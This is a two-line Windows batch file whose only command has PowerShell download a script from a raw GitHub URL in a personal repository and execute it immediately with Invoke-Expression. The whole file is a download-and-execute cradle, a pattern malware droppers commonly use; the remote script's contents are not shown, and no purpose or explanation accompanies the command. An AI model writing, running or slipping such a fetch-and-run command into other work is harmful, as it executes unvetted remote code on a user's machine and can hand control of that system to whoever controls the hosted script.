@echo off
powershell -Command "Invoke-Expression (Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/idonotknowyoudev/myfiles/refs/heads/main/script-download.ps1' -UseBasicParsing).Content"
